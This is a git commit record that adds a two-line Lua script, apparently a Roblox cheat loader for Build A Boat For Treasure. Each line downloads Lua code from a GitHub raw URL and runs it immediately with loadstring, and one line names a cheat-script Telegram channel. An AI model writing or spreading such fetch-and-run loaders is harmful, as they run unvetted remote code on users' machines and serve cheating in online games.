e54750a19aaa3ac1fd4d09ab2fb4920c921786e3
kotMa0s1n <maksimskiba158@gmail.com>
2024-07-17 17:01:01 +0300

    Create BaBfT.lua

---
+++ BaBfT.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kotMa0s1n/maxkiti01/main/max.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Waza80/scripts-new/main/BuildABoat.lua"))("t.me/arceusxscripts")
